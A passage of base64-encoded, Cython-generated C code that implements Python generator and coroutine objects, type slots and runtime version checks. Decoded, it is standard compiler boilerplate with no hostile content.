0aW5lT2JqZWN0ICpnZW4gPSBQeU9iamVjdF9HQ19OZXcoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB0eXBlKTtcbiAgICBpZiAodW5saWtlbHkoIWdlbikpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoZ2VuLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpO1xufVxuc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KFxuICAgICAgICAgICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7XG4gICAgZ2VuLT5ib2R5ID0gYm9keTtcbiAgICBnZW4tPmNsb3N1cmUgPSBjbG9zdXJlO1xuICAgIFB5X1hJTkNSRUYoY2xvc3VyZSk7XG4gICAgZ2VuLT5pc19ydW5uaW5nID0gMDtcbiAgICBnZW4tPnJlc3VtZV9sYWJlbCA9IDA7XG4gICAgZ2VuLT5jbGFzc29iaiA9IE5VTEw7XG4gICAgZ2VuLT55aWVsZGZyb20gPSBOVUxMO1xuICAgIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQgPSBOVUxMO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDtcbiAgICAjZWxzZVxuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlID0gTlVMTDtcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSBOVUxMO1xuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMO1xuICAgICNlbmRpZlxuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5wcmV2aW91c19pdGVtID0gTlVMTDtcbiNlbmRpZlxuICAgIGdlbi0+Z2lfd2Vha3JlZmxpc3QgPSBOVUxMO1xuICAgIFB5X1hJTkNSRUYocXVhbG5hbWUpO1xuICAgIGdlbi0+Z2lfcXVhbG5hbWUgPSBxdWFsbmFtZTtcbiAgICBQeV9YSU5DUkVGKG5hbWUpO1xuICAgIGdlbi0+Z2lfbmFtZSA9IG5hbWU7XG4gICAgUHlfWElOQ1JFRihtb2R1bGVfbmFtZSk7XG4gICAgZ2VuLT5naV9tb2R1bGVuYW1lID0gbW9kdWxlX25hbWU7XG4gICAgUHlfWElOQ1JFRihjb2RlKTtcbiAgICBnZW4tPmdpX2NvZGUgPSBjb2RlO1xuICAgIGdlbi0+Z2lfZnJhbWUgPSBOVUxMO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKGdlbik7XG4gICAgcmV0dXJuIGdlbjtcbn1cbnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikge1xuICAgIGNoYXIgcmVzdWx0O1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pO1xuICAgICNlbmRpZlxuICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZztcbiAgICBnZW4tPmlzX3J1bm5pbmcgPSAxO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTtcbiAgICAjZW5kaWZcbiAgICBhc3NlcnQoZ2VuLT5pc19ydW5uaW5nKTtcbiAgICBnZW4tPmlzX3J1bm5pbmcgPSAwO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICAjZW5kaWZcbn1cbnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikge1xuICAgIGNoYXIgcmVzdWx0O1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pO1xuICAgICNlbmRpZlxuICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZztcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlcihQeU9iamVjdCAqZ2VuLCB2b2lkICpjbG9zdXJlKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY2xvc3VyZSk7XG4gICAgY2hhciByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoKF9fcHl4X0Nvcm91dGluZU9iamVjdCopZ2VuKTtcbiAgICBpZiAocmVzdWx0KSBQeV9SRVRVUk5fVFJVRTtcbiAgICBlbHNlIFB5X1JFVFVSTl9GQUxTRTtcbn1cbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG5zdGF0aWMgdm9pZCBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQoUHlUeXBlT2JqZWN0ICp0eXBlLCBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCAqc3RhdGljX2Ftc2VuZF9tZXRob2RzLCBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgYW1fc2VuZCkge1xuICAgIFB5X3NzaXplX3QgcHRyX29mZnNldCA9IChjaGFyKikodHlwZS0+dHBfYXNfYXN5bmMpIC0gKGNoYXIqKXR5cGU7XG4gICAgaWYgKHB0cl9vZmZzZXQgPCAwIHx8IHB0cl9vZmZzZXQgPiB0eXBlLT50cF9iYXNpY3NpemUpIHtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBtZW1jcHkoKHZvaWQqKXN0YXRpY19hbXNlbmRfbWV0aG9kcywgKHZvaWQqKSh0eXBlLT50cF9hc19hc3luYyksIHNpemVvZigqdHlwZS0+dHBfYXNfYXN5bmMpKTtcbiAgICBzdGF0aWNfYW1zZW5kX21ldGhvZHMtPmFtX3NlbmQgPSBhbV9zZW5kO1xuICAgIHR5cGUtPnRwX2FzX2FzeW5jID0gX19QeXhfU2xvdFRwQXNBc3luYyhzdGF0aWNfYW1zZW5kX21ldGhvZHMpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7XG4gICAgX19QeXhfVHlwZU5hbWUgc2VsZl90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUoKFB5T2JqZWN0KilzZWxmKSk7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwgImNhbm5vdCBwaWNrbGUgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IixcbiAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmX3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHNlbGZfdHlwZV9uYW1lKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cblxuXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfR2VuZXJhdG9yX21ldGhvZHNbXSA9IHtcbiAgICB7InNlbmQiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9TZW5kLCBNRVRIX08sXG4gICAgIFB5RG9jX1NUUigic2VuZChhcmcpIC0+IHNlbmQgXCdhcmdcJyBpbnRvIGdlbmVyYXRvcixcXG5yZXR1cm4gbmV4dCB5aWVsZGVkIHZhbHVlIG9yIHJhaXNlIFN0b3BJdGVyYXRpb24uIil9LFxuICAgIHsidGhyb3ciLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9UaHJvdywgTUVUSF9WQVJBUkdTLFxuICAgICBQeURvY19TVFIoInRocm93KHR5cFssdmFsWyx0Yl1dKSAtPiByYWlzZSBleGNlcHRpb24gaW4gZ2VuZXJhdG9yLFxcbnJldHVybiBuZXh0IHlpZWxkZWQgdmFsdWUgb3IgcmFpc2UgU3RvcEl0ZXJhdGlvbi4iKX0sXG4gICAgeyJjbG9zZSIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZCwgTUVUSF9OT0FSR1MsXG4gICAgIFB5RG9jX1NUUigiY2xvc2UoKSAtPiByYWlzZSBHZW5lcmF0b3JFeGl0IGluc2lkZSBnZW5lcmF0b3IuIil9LFxuICAgIHsiX19yZWR1Y2VfZXhfXyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4LCBNRVRIX08sIDB9LFxuICAgIHsiX19yZWR1Y2VfXyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4LCBNRVRIX05PQVJHUywgMH0sXG4gICAgezAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0dlbmVyYXRvcl9tZW1iZXJsaXN0W10gPSB7XG4gICAgeyJnaV95aWVsZGZyb20iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB5aWVsZGZyb20pLCBSRUFET05MWSxcbiAgICAgUHlEb2NfU1RSKCJvYmplY3QgYmVpbmcgaXRlcmF0ZWQgYnkgXCd5aWVsZCBmcm9tXCcsIG9yIE5vbmUiKX0sXG4gICAgeyJnaV9jb2RlIiwgVF9PQkpFQ1QsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfY29kZSksIFJFQURPTkxZLCBOVUxMfSxcbiAgICB7Il9fbW9kdWxlX18iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9tb2R1bGVuYW1lKSwgMCwgMH0sXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LFxuICAgIHswLCAwLCAwLCAwLCAwfVxufTtcbnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9HZW5lcmF0b3JfZ2V0c2V0c1tdID0ge1xuICAgIHsiX19uYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfbmFtZSwgKHNldHRlcilfX1B5eF9Db3JvdXRpbmVfc2V0X25hbWUsXG4gICAgIFB5RG9jX1NUUigibmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LFxuICAgIHsiX19xdWFsbmFtZV9fIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfcXVhbG5hbWUsXG4gICAgIFB5RG9jX1NUUigicXVhbGlmaWVkIG5hbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSxcbiAgICB7ImdpX2ZyYW1lIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lLCBOVUxMLFxuICAgICBQeURvY19TVFIoIkZyYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sXG4gICAgeyJnaV9ydW5uaW5nIiwgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlciwgTlVMTCwgTlVMTCwgTlVMTH0sXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0dlbmVyYXRvclR5cGVfc2xvdHNbXSA9IHtcbiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfZGVhbGxvY30sXG4gICAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZX0sXG4gICAge1B5X3RwX2l0ZXIsICh2b2lkICopUHlPYmplY3RfU2VsZkl0ZXJ9LFxuICAgIHtQeV90cF9pdGVybmV4dCwgKHZvaWQgKilfX1B5eF9HZW5lcmF0b3JfTmV4dH0sXG4gICAge1B5X3RwX21ldGhvZHMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21ldGhvZHN9LFxuICAgIHtQeV90cF9tZW1iZXJzLCAodm9pZCAqKV9fcHl4X0dlbmVyYXRvcl9tZW1iZXJsaXN0fSxcbiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzfSxcbiAgICB7UHlfdHBfZ2V0YXR0cm8sICh2b2lkICopIFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyfSxcbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAge1B5X3RwX2ZpbmFsaXplLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9kZWx9LFxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMVxuICAgIHtQeV9hbV9zZW5kLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9BbVNlbmR9LFxuI2VuZGlmXG4gICAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMgPSB7XG4gICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJnZW5lcmF0b3IiLFxuICAgIHNpemVvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QpLFxuICAgIDAsXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMFxuICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8XG4jZW5kaWZcbiAgICBQeV9UUEZMQUdTX0RFRkFVTFQgfCBQeV9UUEZMQUdTX0hBVkVfR0MgfCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUgfCBfX1B5eF9UUEZMQUdTX0hBVkVfQU1fU0VORCxcbiAgICBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzXG59O1xuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbnN0YXRpYyBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmM7XG4jZW5kaWZcbnN0YXRpYyBpbnQgX19weXhfR2VuZXJhdG9yX2luaXQoUHlPYmplY3QgKm1vZHVsZSkge1xuICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7XG4gICAgbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoXG4gICAgICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlLCBtb2R1bGUsICZfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMsIE5VTEwpO1xuICAgIGlmICh1bmxpa2VseSghbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbiAgICBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQobXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCAmX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jLCAmX19QeXhfQ29yb3V0aW5lX0FtU2VuZCk7XG4jZW5kaWZcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgfVxuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgUHlfTm9uZSwgJnJldHZhbCwgMCk7XG4gICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAodm9pZCkgcmVzdWx0O1xuICAgIGFzc2VydCAocmVzdWx0ID09IFBZR0VOX1JFVFVSTiB8fCByZXN1bHQgPT0gUFlHRU5fRVJST1IpO1xuICAgIGFzc2VydCAoKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgcmV0dmFsICE9IE5VTEwpIHx8IChyZXN1bHQgPT0gUFlHRU5fRVJST1IgJiYgcmV0dmFsID09IE5VTEwpKTtcbiAgICByZXR1cm4gcmV0dmFsO1xufVxuXG5cbnN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24odm9pZCkge1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMFxuICAgIHJldHVybiBQeV9WZXJzaW9uICYgfjB4RkZVTDtcbiNlbHNlXG4gICAgc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9IDA7XG4gICAgaWYgKF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPT0gMCkge1xuICAgICAgICBjb25zdCBjaGFyKiBydF92ZXJzaW9uID0gUHlfR2V0VmVyc2lvbigpO1xuICAgICAgICB1bnNpZ25lZCBsb25nIHZlcnNpb24gPSAwO1xuICAgICAgICB1bnNpZ25lZCBsb25nIGZhY3RvciA9IDB4MDEwMDAwMDBVTDtcbiAgICAgICAgdW5zaWduZWQgaW50IGRpZ2l0ID0gMDtcbiAgICAgICAgaW50IGkgPSAwO1xuICAgICAgICB3aGlsZSAoZmFjdG9yKSB7XG4gICAgICAgICAgICB3aGlsZSAoXCcwXCcgPD0gcnRfdmVyc2lvbltpXSAmJiBydF92ZXJzaW9uW2ldIDw9IFwnOVwnKSB7XG4gICAgICAgICAgICAgICAgZGlnaXQgPSBkaWdpdCAqIDEwICsgKHVuc2lnbmVkIGludCkgKHJ0X3ZlcnNpb25baV0gLSBcJzBcJyk7XG4gICAgICAgICAgICAgICAgKytpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmVyc2lvbiArPSBmYWN0b3IgKiBkaWdpdDtcbiAgICAgICAgICAgIGlmIChydF92ZXJzaW9uW2ldICE9IFwnLlwnKVxuICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgZGlnaXQgPSAwO1xuICAgICAgICAgICAgZmFjdG9yID4+PSA4O1xuICAgICAgICAgICAgKytpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSB2ZXJzaW9uO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbjtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcikge1xuICAgIGNvbnN0IHVuc2lnbmVkIGxvbmcgTUFKT1JfTUlOT1IgPSAweEZGRkYwMDAwVUw7XG4gICAgaWYgKChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID09IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICBpZiAobGlrZWx5KGFsbG93X25ld2VyICYmIChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID4gKGN0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikpKVxuICAgICAgICByZXR1cm4gMTtcbiAgICB7XG4gICAgICAgIGNoYXIgbWVzc2FnZVsyMDBdO1xuICAgICAgICBQeU9TX3NucHJpbnRmKG1lc3NhZ2UsIHNpemVvZihtZXNzYWdlKSxcbiAgICAgICAgICAgICAgICAgICAgICAiY29tcGlsZSB0aW1lIFB5dGhvbiB2ZXJzaW9uICVkLiVkICJcbiAgICAgICAgICAgICAgICAgICAgICAib2YgbW9kdWxlIFwnJS4xMDBzXCcgIlxuICAgICAgICAgICAgICAgICAgICAgICIlcyAiXG4gICAgICAgICAgICAgICAgICAgICAgInJ1bnRpbWUgdmVyc2lvbiAlZC4lZCIsXG4gICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChjdF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChjdF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpLFxuICAgICAgICAgICAgICAgICAgICAgICBfX1B5eF9NT0RVTEVfTkFNRSxcbiAgICAgICAgICAgICAgICAgICAgICAgKGFsbG93X25ld2VyKSA/ICJ3YXMgbmV3ZXIgdGhhbiIgOiAiZG9lcyBub3QgbWF0Y2giLFxuICAgICAgICAgICAgICAgICAgICAgICAoaW50KSAocnRfdmVyc2lvbiA+PiAyNCksIChpbnQpICgocnRfdmVyc2lvbiA+PiAxNikgJiAweEZGKVxuICAgICAgICk7XG4gICAgICAgIHJldHVybiBQeUVycl9XYXJuRXgoTlVMTCwgbWVzc2FnZSwgMSk7XG4gICAgfVxufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fUHlDb2RlX05ldyhpbnQgYSwgaW50IHAsIGludCBrLCBpbnQgbCwgaW50IHMsIGludCBmLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgaW50IGZsaW5lLCBQeU9iamVjdCAqbG5vcykge1xuICAgICAgICBQeU9iamVjdCAqZXhjZXB0aW9uX3RhYmxlID0gTlVMTDtcbiAgICAgICAgUHlPYmplY3QgKnR5cGVzX21vZHVsZT1OVUxMLCAqY29kZV90eXBlPU5VTEwsICpyZXN1bHQ9TlVMTDtcbiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgICAgIFB5T2JqZWN0ICp2ZXJzaW9uX2luZm87XG4gICAgICAgIFB5T2JqZWN0ICpweV9taW5vcl92ZXJzaW9uID0gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGxvbmcgbWlub3JfdmVyc2lvbiA9IDA7XG4gICAgICAgIFB5T2JqZWN0ICp0eXBlLCAqdmFsdWUsICp0cmFjZWJhY2s7XG4gICAgICAgIFB5RXJyX0ZldGNoKCZ0eXBlLCAmdmFsdWUsICZ0cmFjZWJhY2spO1xuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwXG4gICAgICAgIG1pbm9yX3ZlcnNpb24gPSAxMTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgaWYgKCEodmVyc2lvbl9pbmZvID0gUHlTeXNfR2V0T2JqZWN0KCJ2ZXJzaW9uX2luZm8iKSkpIGdvdG8gZW5kO1xuICAgICAgICBpZiAoIShweV9taW5vcl92ZXJzaW9uID0gUHlTZXF1ZW5jZV9HZXRJdGVtKHZlcnNpb25faW5mbywgMSkpKSBnb3RvIGVuZDtcbiAgICAgICAgbWlub3JfdmVyc2lvbiA9IFB5TG9uZ19Bc0xvbmcocHlfbWlub3JfdmVyc2lvbik7XG4gICAgICAgIFB5X0RFQ1JFRihweV9taW5vcl92ZXJzaW9uKTtcbiAgICAgICAgaWYgKG1pbm9yX3ZlcnNpb24gPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBlbmQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAoISh0eXBlc19tb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIikpKSBnb3RvIGVuZDtcbiAgICAgICAgaWYgKCEoY29kZV90eXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc19tb2R1bGUsICJDb2RlVHlwZSIpKSkgZ290byBlbmQ7XG4gICAgICAgIGlmIChtaW5vcl92ZXJzaW9uIDw9IDcpIHtcbiAgICAgICAgICAgICh2b2lkKXA7XG4gICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlPT09PT09pT09PIiwgYSwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zLCBmdiwgY2VsbCk7XG4gICAgICAgIH0gZWxzZSBpZiAobWlub3JfdmVyc2lvbiA8PSAxMCkge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT2lPT08iLCBhLHAsIGssIGwsIHMsIGYsIGNvZGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKCEoZXhjZXB0aW9uX3RhYmxlID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShOVUxMLCAwKSkpIGdvdG8gZW5kO1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT09pT09PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIG5hbWUsIGZsaW5lLCBsbm9zLCBleGNlcHRpb25fdGFibGUsIGZ2LCBjZWxsKTtcbiAgICAgICAgfVxuICAgIGVuZDpcbiAgICAgICAgUHlfWERFQ1JFRihjb2RlX3R5cGUpO1xuICAgICAgICBQeV9YREVDUkVGKGV4Y2VwdGlvbl90YWJsZSk7XG4gICAgICAgIFB5X1hERUNSRUYodHlwZXNfbW9kdWxlKTtc